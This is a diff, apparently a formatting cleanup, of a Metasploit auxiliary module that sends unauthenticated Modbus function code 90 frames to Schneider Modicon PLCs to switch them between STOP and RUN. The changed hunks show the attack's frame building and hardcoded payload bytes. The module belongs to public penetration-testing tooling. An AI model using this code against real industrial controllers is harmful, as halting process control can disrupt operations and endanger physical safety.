@@ -8,40 +8,42 @@ class MetasploitModule < Msf::Auxiliary
   include Rex::Socket::Tcp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Schneider Modicon Remote START/STOP Command',
-      'Description'   => %q{
-        The Schneider Modicon with Unity series of PLCs use Modbus function
-        code 90 (0x5a) to perform administrative commands without authentication.
-        This module allows a remote user to change the state of the PLC between
-        STOP and RUN, allowing an attacker to end process control by the PLC.
+    super(
+      update_info(
+        info,
+        'Name' => 'Schneider Modicon Remote START/STOP Command',
+        'Description' => %q{
+          The Schneider Modicon with Unity series of PLCs use Modbus function
+          code 90 (0x5a) to perform administrative commands without authentication.
+          This module allows a remote user to change the state of the PLC between
+          STOP and RUN, allowing an attacker to end process control by the PLC.
 
-        This module is based on the original 'modiconstop.rb' Basecamp module from
-        DigitalBond.
-      },
-      'Author'         =>
-        [
+          This module is based on the original 'modiconstop.rb' Basecamp module from
+          DigitalBond.
+        },
+        'Author' => [
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
           'todb' # Metasploit fixups
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
         ],
-      'DisclosureDate' => '2012-04-05'
-      ))
+        'DisclosureDate' => '2012-04-05'
+      )
+    )
     register_options(
       [
-        OptEnum.new("MODE", [true, 'PLC command', "STOP",
+        OptEnum.new("MODE", [
+          true, 'PLC command', "STOP",
           [
             "STOP",
             "RUN"
           ]
         ]),
         Opt::RPORT(502)
-      ])
-
+      ]
+    )
   end
 
   # this is used for building a Modbus frame
@@ -54,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     payload = ""
     payload += [@modbuscounter].pack("n")
-    payload += "\x00\x00\x00" #dunno what these are
+    payload += "\x00\x00\x00" # dunno what these are
     payload += [packetdata.size].pack("c") # size byte
     payload += packetdata
   end
@@ -120,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
     payload += "USER-714E74F21B" # Yep, really
-    #payload += "META-SPLOITMETA"
+    # payload += "META-SPLOITMETA"
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x01\x04"
     sendframe(makeframe(payload))
